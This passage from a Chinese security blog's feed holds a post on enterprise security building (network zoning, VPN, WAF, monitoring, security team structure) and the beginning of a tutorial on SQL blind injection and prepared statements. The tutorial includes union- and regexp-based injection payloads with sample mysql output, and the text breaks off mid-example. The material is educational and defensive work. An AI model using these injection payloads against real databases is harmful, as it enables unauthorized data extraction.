&lt;li&gt;&lt;a href=&quot;#csp&quot;&gt;CSP&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#csp%E7%AE%80%E4%BB%8B&quot;&gt;CSP简介&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8E%9F%E7%90%86&quot;&gt;原理&lt;/a</summary>
      
    
    
    
    
    <category term="前端安全" scheme="https://yinwc.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>甲方安全建设</title>
    <link href="https://yinwc.github.io/2021/02/24/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    <id>https://yinwc.github.io/2021/02/24/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/</id>
    <published>2021-02-24T08:51:32.000Z</published>
    <updated>2023-04-21T05:52:20.044Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4">基本步骤</a></li><li><a href="#%E7%BD%91%E7%BB%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">网络系统安全建设</a><ul><li><a href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E5%88%92%E5%88%86">安全域划分</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E9%A3%8E%E9%99%A9%E7%AD%89%E7%BA%A7">安全域风险等级</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E9%A3%8E%E9%99%A9%E5%AF%B9%E8%B1%A1">安全域风险对象</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%96%B9%E6%A1%88">安全建设方案</a><ul><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">办公网-网络安全建设</a><ul><li><a href="#wifi%E5%AE%89%E5%85%A8">WIFI安全</a></li><li><a href="#vpn%E5%AE%89%E5%85%A8">VPN安全</a></li><li><a href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F%E9%87%87%E9%9B%86%E6%A3%80%E6%B5%8B">日志流量采集检测</a></li><li><a href="#router%E7%BB%9F%E4%B8%80%E7%AE%A1%E7%90%86">Router统一管理</a></li><li><a href="#%E7%BB%88%E7%AB%AF%E7%BD%91%E7%BB%9C%E5%87%86%E5%85%A5">终端网络准入</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E4%B9%8B%E9%97%B4%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB">安全域之间网络隔离</a></li></ul></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">办公网-系统安全建设</a><ul><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8">办公网服务器安全</a></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91%E7%BB%88%E7%AB%AFpc%E5%AE%89%E5%85%A8">办公网终端PC安全</a></li></ul></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">办公网-应用安全建设</a><ul><li><a href="#sso%E7%BB%9F%E4%B8%80%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3">SSO统一登录入口</a></li><li><a href="#%E7%BD%91%E7%AB%99%E6%B0%B4%E5%8D%B0%E6%8A%80%E6%9C%AF">网站水印技术</a></li><li><a href="#%E9%82%AE%E7%AE%B1%E5%AE%89%E5%85%A8">邮箱安全</a></li><li><a href="#waf">WAF</a></li></ul></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E5%91%98%E5%B7%A5%E5%AE%89%E5%85%A8">办公网-员工安全</a><ul><li><a href="#%E5%9C%A8%E8%81%8C%E5%91%98%E5%B7%A5%E5%AE%89%E5%85%A8%E6%95%99%E8%82%B2">在职员工安全教育</a></li><li><a href="#%E7%A6%BB%E8%81%8C%E5%91%98%E5%B7%A5%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1">离职员工安全审计</a></li></ul></li><li><a href="#%E5%8A%9E%E5%85%AC%E7%BD%91-%E5%AE%89%E5%85%A8%E5%90%88%E8%A7%84">办公网-安全合规</a></li><li><a href="#%E7%94%9F%E4%BA%A7%E7%BD%91-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">生产网-系统安全建设</a></li><li><a href="#%E5%A4%96%E7%BD%91%E8%BE%B9%E7%95%8C%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">外网边界安全建设</a></li><li><a href="#%E4%BA%A7%E5%93%81%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">产品安全建设</a></li><li><a href="#%E4%BC%81%E4%B8%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97">企业红蓝对抗</a></li><li><a href="#%E7%A7%81%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8">私有云安全</a></li><li><a href="#%E7%A7%81%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8">私有云安全</a></li><li><a href="#%E5%AE%89%E5%85%A8%E7%BB%84%E7%BB%87%E6%9E%B6%E6%9E%84">安全组织架构</a><ul><li><a href="#%E5%B0%8F%E8%A7%84%E6%A8%A1">小规模</a></li><li><a href="#%E5%A4%A7%E8%A7%84%E6%A8%A1">大规模</a></li></ul></li></ul></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96">其他</a><ul><li><a href="#%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E5%BE%85%E5%AE%8C%E5%96%84">开源项目（待完善）</a></li><li><a href="#reference">Reference</a></li></ul></li></ul><!-- /TOC --><h1 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h1><p><strong>1. 资产梳理</strong></p><ul><li>IP列表、业务分组(负责人、联系方向)、业务属性</li><li>业务端口</li><li>业务应用架构、技术堆栈</li></ul><p><strong>2.边界安全，防火墙策略控制（需要梳理业务端口）</strong></p><ul><li>如果是硬件，使用防火墙统一控制</li><li>如果是操作系统，Iptalbes＋IPSEC</li><li>及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略)</li><li>跳板机安全控制</li></ul><p><strong>3.账户安全管理</strong></p><ul><li>弱密码</li><li>root、sudoer权限</li><li>账户、授权、访问、审计等等</li></ul><p><strong>4.服务器安全</strong></p><ul><li>安全基线检测</li><li>操作审计</li><li>异常登录审计(日志收集分析)</li><li>漏洞清点&#x2F;扫描，补丁修复测试和推进</li></ul><p><strong>5.WEB安全</strong></p><ul><li>应用渗透测试</li><li>接口安全(加密、通信)</li><li>webshell实时监测</li><li>Nginx日志分析&#x2F;Nginx流量旁路分析</li></ul><p><strong>6.业务风控安全</strong></p><ul><li>用户安全机制（密码、验证码、登录）</li><li>交易安全</li></ul><p><strong>7.安全培训</strong></p><ul><li>安全意识培训</li><li>运维安全培训</li><li>WEB安全开发</li></ul><p><strong>8.安全规范和流程</strong></p><ul><li>人员入职账户开通</li><li>人员离职账户注销</li><li>服务器上下架安全管理</li><li>安全应急响应机制</li></ul><p><strong>9.内网安全</strong></p><ul><li>内网服务器安全</li><li>账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统)</li><li>弱口令监测(NTLM&#x2F;LM)</li><li>账户异常登录</li><li>网络隔离（物理／虚拟化）</li><li>网络准入</li><li>PC安全(病毒统一管理、通知处理)</li></ul><h1 id="网络系统安全建设"><a href="#网络系统安全建设" class="headerlink" title="网络系统安全建设"></a>网络系统安全建设</h1><h2 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h2><p>内部网络系统：主要指OA办公网内部、生产网内部、测试开发网内部、以及其他内部网络系统<br>外部网络系统：主要指OA办公网互联网边界、生产网互联网边界、测试开发网互联网边界、互联网上相关所属的网络系统（不限于：公有云、Github、云存储等）</p><h2 id="安全域风险等级"><a href="#安全域风险等级" class="headerlink" title="安全域风险等级"></a>安全域风险等级</h2><p>外部网络系统&gt;生产网内部网络系统&gt;测试开发网内部网络系统&gt;办公网内部网络系统&gt;其他网络系统</p><h2 id="安全域风险对象"><a href="#安全域风险对象" class="headerlink" title="安全域风险对象"></a>安全域风险对象</h2><p>外部系统：外部攻击者（黑客、白帽子）<br>内部系统：内部违规操作员工、已渗透到内网系统的外部攻击者</p><h2 id="安全建设方案"><a href="#安全建设方案" class="headerlink" title="安全建设方案"></a>安全建设方案</h2><p>由于不同安全域的风险等级、风险对象有所区别，因此我个人认为不同安全域的安全建设方案也该因地制宜。以下文章篇幅，我将根据不同安全域通过事前、事中、事后三个方面记录信息安全建设思路。</p><h3 id="办公网-网络安全建设"><a href="#办公网-网络安全建设" class="headerlink" title="办公网-网络安全建设"></a>办公网-网络安全建设</h3><h4 id="WIFI安全"><a href="#WIFI安全" class="headerlink" title="WIFI安全"></a>WIFI安全</h4><p>事前安全措施：1、建立双因素认证（通过个人账户密码+短信、动态密码）；2、建立设备安全认证（限定特定的设备才能连接）<br>事中安全措施：1、建议WIFI账号爆破监控；2、WIFI账号爆破封禁策略运营</p><h4 id="VPN安全"><a href="#VPN安全" class="headerlink" title="VPN安全"></a>VPN安全</h4><p>事前安全措施：1、远程接入公司内部网络进行双因素认证（个人账户密码+短信、动态密码）；2、硬件指纹获取识别<br>事中安全措施：1、VPN异地登录；2、异常登录监控；3、VPN爆破监控以及封禁策略<br>事后安全措施：1、联系VPN账号所属者确定攻击行为</p><h4 id="日志流量采集检测"><a href="#日志流量采集检测" class="headerlink" title="日志流量采集检测"></a>日志流量采集检测</h4><p>事前安全措施：1、办公网网络流量（到边界、到IDC）；2、日志采集检测<br>事中安全措施：1、员工异常行为监控（比如上传内部数据到网盘等）；2、攻击监控<br>事后安全措施：1、对涉事员工进行相应处罚</p><h4 id="Router统一管理"><a href="#Router统一管理" class="headerlink" title="Router统一管理"></a>Router统一管理</h4><p>事前安全措施：1、即统一管理内部网络映射到外网需求（可利用nginx反向代理），减少系统暴露风险<br>事中安全措施：1、外网端口扫描监控</p><h4 id="终端网络准入"><a href="#终端网络准入" class="headerlink" title="终端网络准入"></a>终端网络准入</h4><p>事前安全措施：1、办公终端（PC）需要安装准入程序，才允许上内部网络<br>事中安全措施：1、终端异常行为监控<br>事后安全措施：1、对涉事员工进行相应处罚</p><h4 id="安全域之间网络隔离"><a href="#安全域之间网络隔离" class="headerlink" title="安全域之间网络隔离"></a>安全域之间网络隔离</h4><p>例如：办公网与生产网之间只能通过堡垒机登录，且只有特定端口才能通信等策略（根据实际情况配置）</p><h3 id="办公网-系统安全建设"><a href="#办公网-系统安全建设" class="headerlink" title="办公网-系统安全建设"></a>办公网-系统安全建设</h3><h4 id="办公网服务器安全"><a href="#办公网服务器安全" class="headerlink" title="办公网服务器安全"></a>办公网服务器安全</h4><p>事前安全措施：1、服务器基线检查；2、补丁检查；3、端口服务监控；4、服务器登录统一管理<br>事中安全措施：1、服务器进程监控；2、敏感账户登录监控；3、敏感命令执行监控；4、文件上传下载等（依赖主机安全产品，服务器上安装Agent）<br>事后安全措施：1、服务器木马；2、后门查杀；3、服务器安全加固（服务器应急响应）</p><h4 id="办公网终端PC安全"><a href="#办公网终端PC安全" class="headerlink" title="办公网终端PC安全"></a>办公网终端PC安全</h4><p>事前安全措施：1、防病毒；2、DLP；3、水印；4、行为监控<br>事中安全措施：1、DLP数据监控；2、水印监控</p><h3 id="办公网-应用安全建设"><a href="#办公网-应用安全建设" class="headerlink" title="办公网-应用安全建设"></a>办公网-应用安全建设</h3><h4 id="SSO统一登录入口"><a href="#SSO统一登录入口" class="headerlink" title="SSO统一登录入口"></a>SSO统一登录入口</h4><p>事前安全措施：1、内部所有的办公系统使用一套SSO认证系统，可有效管理员工账户密码，预防弱口令等风险<br>事中安全措施：1、异常登录监控；2、弱口令监控<br>事后安全措施：1、强制修改用户账号密码；2、加固SSO</p><h4 id="网站水印技术"><a href="#网站水印技术" class="headerlink" title="网站水印技术"></a>网站水印技术</h4><p>事前安全措施：1、对有重要敏感数据的网站加上水印，防止数据被截图泄露等风险<br>事中安全措施：1、水印攻防监控<br>事后安全措施：1、对涉事员工进行相应处罚</p><h4 id="邮箱安全"><a href="#邮箱安全" class="headerlink" title="邮箱安全"></a>邮箱安全</h4><p>事前安全措施：1、邮箱访问安全加固方案，用来解决邮箱接口被爆破风险；2、附件安全扫描；3、异地登录报警；4、弱口令扫描<br>事中安全措施：1、邮件爆破监控；2、账户或者IP封禁；3、异地登录监控<br>事后安全措施：1、若爆破成功，则强制修改相关员工密码，且排查安全风险</p><h4 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h4><p>事前安全措施：1、应用服务器上部署WAF，拦截web攻击<br>事中安全措施：2、WAF上进行攻击监测<br>事后安全措施：3、更新优化WAF拦截策略</p><h3 id="办公网-员工安全"><a href="#办公网-员工安全" class="headerlink" title="办公网-员工安全"></a>办公网-员工安全</h3><h4 id="在职员工安全教育"><a href="#在职员工安全教育" class="headerlink" title="在职员工安全教育"></a>在职员工安全教育</h4><p>事前安全措施：<br>1、定期对所有员工进行安全培训；<br>2、对新员工进行入职安全培训；<br>3、定期开展内部钓鱼测试；<br>4、针对RD可培训WEB安全开发；<br>5、针对OP可培训安全运维。<br>事中安全措施：1、对员工行为进行监控（可通过前面介绍的几种方案）；2、对钓鱼邮件进行告警<br>事后安全措施：1、对涉事员工进行相应处罚；2、钓鱼邮件影响评估</p><h4 id="离职员工安全审计"><a href="#离职员工安全审计" class="headerlink" title="离职员工安全审计"></a>离职员工安全审计</h4><p>1、离职行为审计；2、办公电脑审计；3、人员离职账户注销</p><h3 id="办公网-安全合规"><a href="#办公网-安全合规" class="headerlink" title="办公网-安全合规"></a>办公网-安全合规</h3><p>1、ISO27001；2、等保2.0</p><h3 id="生产网-系统安全建设"><a href="#生产网-系统安全建设" class="headerlink" title="生产网-系统安全建设"></a>生产网-系统安全建设</h3><ul><li>主机安全:1、内部资产发现；2、webshell监控；3、反弹shell监控等日常运营工作</li><li>日志分析监控：1、可以偏业务一些，比如接口防刷监控运维；2、也可以偏系统一些，攻击行为的监控运维</li><li>网络抗DDOS、应用抗CC：主要靠部署一些流量清洗产品</li><li>入侵检测、防御：IDS、IPS（对于告警记录的运维工作）</li><li>堡垒机：服务器统一登录管理，秘钥管理，访问控制策略运维工作</li><li>Router层统一映射管理：互联网端口、IP映射管理，结合cmdb平台运维工作</li><li>WAF：部署waf产品，拦截WEB攻击，告警记录运营工作</li><li>端口开放策略（ACL）</li><li>IPTABLES</li><li>态势感知（SOC平台）：流量监控平台，通过监控不同方向的流量，发现攻击行为</li><li>蜜罐（欺骗防御）：通过在内、外部部署蜜罐产品，发现攻击行为</li><li>邮件沙箱、网关：针对邮件钓鱼、恶意附件的检测</li><li>威胁情报：往往跟态势感知相结合</li></ul><p>除了系统层面的安全建设，生产网更多的是跟运维相关的一些安全内容（比如安全基线等），也包含项目上线的一些安全流程规范管理。</p><h3 id="外网边界安全建设"><a href="#外网边界安全建设" class="headerlink" title="外网边界安全建设"></a>外网边界安全建设</h3><ul><li>资产收集：IP、域名、URL、数据接口、端口服务监控，梳理统计内外网端口映射关系、业务线负责人等信息，盘点边界资产。</li><li>黑盒漏洞扫描：WEB漏洞扫描、主机漏洞扫描（可采购也可自研，定期巡检）</li><li>业务逻辑漏洞扫描：通过流量、日志被动式检测简单的业务逻辑漏洞</li><li>GITHUB监控：自动化监控github泄露的公司相关代码、服务器个人相关信息等</li><li>SRC上报漏洞响应：建设SRC平台，收集白帽子提交的安全漏洞</li><li>最新漏洞、0day响应：0day、1day漏洞的研究、应急团队，推动漏洞修复</li><li>威胁情报</li><li>渗透测试：定期开展从互联网边界实施的渗透测试工作，寻找安全漏洞</li></ul><p>外网边界的安全建设工作，大致分为三个步骤：资产盘点、漏洞扫描、漏洞推修（定期重复），0day漏洞应急另算。</p><h3 id="产品安全建设"><a href="#产品安全建设" class="headerlink" title="产品安全建设"></a>产品安全建设</h3><p>第一道防线：产品安全设计（早期可通过安全编码、意识培训使RD、PM具备信息安全意识）<br>第二道防线：需求评审、架构评审、代码审计、白盒扫描（通过建立需求安全评审等机制，严格控制新项目上线流程）<br>第三道防线：黑盒扫描、灰盒扫描（项目上线后可定期开展黑盒扫描）<br>第四道防线：SRC、企业蓝军（通过SRC、蓝军渗透发现的漏洞进行补充）<br>在整个产品安全建设过程中，企业可自研沉淀”产品安全开发库”、”SDL流程平台”以及制定”产品安全相关流程制度”。</p><h3 id="企业红蓝对抗"><a href="#企业红蓝对抗" class="headerlink" title="企业红蓝对抗"></a>企业红蓝对抗</h3><p>企业红军：负责企业安全建设、安全监控、安全加固<br>企业蓝军：负责攻击安全堡垒、找出安全薄弱点</p><p>网络安全红军的工作包含了以上所有的安全建设工作，而网络安全蓝军的工作是一个全新的视角，包含不限于：</p><p>内部钓鱼攻击<br>外部漏洞攻击<br>APT攻击<br>内部爆破攻击<br>员工信息收集<br>……<br>企业在蓝军团队建设过程中，可自研沉淀：漏洞扫描器、社工库、漏洞库等</p><h3 id="私有云安全"><a href="#私有云安全" class="headerlink" title="私有云安全"></a>私有云安全</h3><p>有些企业内部会建设私有云，关于私有云安全我接触不多，大致列一下所涉猎的内容：</p><p>网络安全：租户间的虚拟网络隔离、虚拟机与宿主机间的访问策略、同租户不同虚机间的访问策略等<br>数据安全：数据的备份加密、数据接口防重放、数据分级分类等<br>主机安全：防逃逸、内存溢出、入侵检测等<br>安全合规：等保2.0云安全相关章节</p><h3 id="私有云安全-1"><a href="#私有云安全-1" class="headerlink" title="私有云安全"></a>私有云安全</h3><p>有些企业内部会建设私有云，关于私有云安全我接触不多，大致列一下所涉猎的内容：</p><p>网络安全：租户间的虚拟网络隔离、虚拟机与宿主机间的访问策略、同租户不同虚机间的访问策略等<br>数据安全：数据的备份加密、数据接口防重放、数据分级分类等<br>主机安全：防逃逸、内存溢出、入侵检测等<br>安全合规：等保2.0云安全相关章节</p><h3 id="安全组织架构"><a href="#安全组织架构" class="headerlink" title="安全组织架构"></a>安全组织架构</h3><h4 id="小规模"><a href="#小规模" class="headerlink" title="小规模"></a>小规模</h4><p>若公司规模小，个人认为可按事前、事中、事后划分信息安全组织架构（仅供参考）</p><p>系统安全<br>事前团队：负责内外网安全建设<br>事中团队：负责入侵监控、异常监控<br>事后团队：负责应急响应、事后处罚整改<br>产品安全：SDL<br>安全合规<br>业务安全</p><h4 id="大规模"><a href="#大规模" class="headerlink" title="大规模"></a>大规模</h4><p>若公司规模大，可按安全区域划分组织架构（仅供参考）</p><p>系统安全：<br>办公网团队：负责办公网安全建设、安全监控、应急响应（内部可再按照前、中、后细分，再细分，可分WEB、移动、硬件等）<br>生产网团队：负责生产网安全建设、安全监控、应急响应<br>外网边界团队：负责边界安全建设、安全监控、应急响应<br>产品安全：SDL<br>安全合规<br>蓝军团队：如果规模小可不用设置蓝军团队。蓝军团队是脱离安全区域之外的，但属于事前。<br>业务安全<br>云安全</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>红队建设</p><ul><li><a href="https://github.com/aleenzz/Cobalt_Strike_wiki">Cobalt_Strike_wiki</a></li></ul><p>情报</p><ul><li><a href="http://wechat.doonsec.com/">http://wechat.doonsec.com/</a></li><li><a href="https://sec.thief.one/?type_id=a17165288561873d8fdf8e29586c891a">https://sec.thief.one/?type_id=a17165288561873d8fdf8e29586c891a</a></li></ul><p>漏洞预警</p><ul><li><a href="https://sec.thief.one/?type_id=dc31e48fe511b8ec10969ba13d282355">https://sec.thief.one/?type_id=dc31e48fe511b8ec10969ba13d282355</a></li></ul><h2 id="开源项目（待完善）"><a href="#开源项目（待完善）" class="headerlink" title="开源项目（待完善）"></a>开源项目（待完善）</h2><p><a href="http://wiki.beysec.com/">http://wiki.beysec.com/</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s/0Uu_os9MB5ZHnowlWkYbEA">https://mp.weixin.qq.com/s/0Uu_os9MB5ZHnowlWkYbEA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4&quot;&gt;基本步骤&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%BD%91%E7%BB%9C%E7%B3%BB%E7%BB%9F%E5%A</summary>
      
    
    
    
    
    <category term="企业安全" scheme="https://yinwc.github.io/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>深入理解SQL盲注与SQL预编译</title>
    <link href="https://yinwc.github.io/2021/02/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E7%9B%B2%E6%B3%A8%E4%B8%8ESQL%E9%A2%84%E7%BC%96%E8%AF%91/"/>
    <id>https://yinwc.github.io/2021/02/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E7%9B%B2%E6%B3%A8%E4%B8%8ESQL%E9%A2%84%E7%BC%96%E8%AF%91/</id>
    <published>2021-02-02T09:45:08.000Z</published>
    <updated>2023-02-02T07:03:59.396Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#sql%E7%9B%B2%E6%B3%A8">SQL盲注</a><ul><li><a href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">布尔盲注</a></li><li><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">时间盲注</a></li></ul></li><li><a href="#sql%E9%A2%84%E7%BC%96%E8%AF%91">SQL预编译</a><ul><li><a href="#%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8sql%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E6%83%85%E5%86%B5">无法使用sql预编译的情况</a></li><li><a href="#%E5%8E%9F%E7%90%86%E5%8F%8A%E6%96%B9%E6%B3%95">原理及方法</a></li><li><a href="#mybatis%E9%A2%84%E7%BC%96%E8%AF%91">mybatis预编译</a></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><p>所谓的盲注就是猜测，通过寻找差异（包括运行时间的差异和页面返回结果的差异）来进行注入</p><p>也就是说我们想实现的是我们要构造一条语句来测试我们输入的布尔表达式，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注是最基础的一种注入，其本质是使SQL语句永真或永假，使<strong>页面上显示的内容不同</strong>，然后逐个字符的去判断，以此来得到数据库中的所有数据。<br>基于布尔的盲注是在这样的一种情况下使用：</p><ul><li>页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的，那我们就可以利用这个输入布尔值的注入点来注入我们的条件语句，从而能根据页面的返回情况推测出我们输入的语句是否正确(<strong>输入语句的真假直接影响整条查询语句最后查询的结果的真假</strong>)</li></ul><p><strong>常用函数：</strong><br><code>left</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">left(a,b)从左侧截取a的前b位</span><br><span class="line">substr</span><br><span class="line">substr(a,b,c)从b位置开始，截取字符串a的c长度。结合ascii()使用</span><br><span class="line">MID/ORD</span><br><span class="line">mid(a,b,c)同substr</span><br><span class="line">OPD()同ascii()</span><br></pre></td></tr></table></figure><p><code>regexp</code><br>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。<br>原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p><ul><li><p>regexp基本注入方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select (select语句) regexp &#x27;正则&#x27;</span><br><span class="line"># eg：</span><br><span class="line"># 正常查询：</span><br><span class="line">select username from users where id=1;</span><br><span class="line"># 正则注入，若匹配则返回1，不匹配返回0</span><br><span class="line">select (select username from users where id=1) regexp &#x27;^a&#x27;;</span><br><span class="line">^表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0</span><br></pre></td></tr></table></figure></li></ul><p>regexp关键字还可以代替where条件里的&#x3D;号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where password regexp &#x27;^ad&#x27;;</span><br></pre></td></tr></table></figure><p>常用regexp正则语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp &#x27;^[a-z]&#x27;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#x27;^r&#x27;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#x27;^r[a-z]&#x27; #判断一个表的第二个字符串是否在a-z中</span><br></pre></td></tr></table></figure><p>在联合查询中的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,database() regexp &#x27;^s&#x27;,3--+</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">## 普通查询</span><br><span class="line"></span><br><span class="line">mysql&gt; select 123 from test where 1=1;</span><br><span class="line">+-----+</span><br><span class="line">| 123 |</span><br><span class="line">+-----+</span><br><span class="line">| 123 |</span><br><span class="line">+-----+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 123 from test where 1=0;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 使用 ^</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 1^0;</span><br><span class="line">+----+--------+----------+</span><br><span class="line">| id | name   | password |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">|  1 | v1zkra | 123456   |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 1^1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 使用 &amp;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 1 &amp; 1;</span><br><span class="line">+----+--------+----------+</span><br><span class="line">| id | name   | password |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">|  1 | v1zkra | 123456   |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 1 &amp; 0;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 使用 |</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 0 | 1;</span><br><span class="line">+----+--------+----------+</span><br><span class="line">| id | name   | password |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">|  1 | v1zkra | 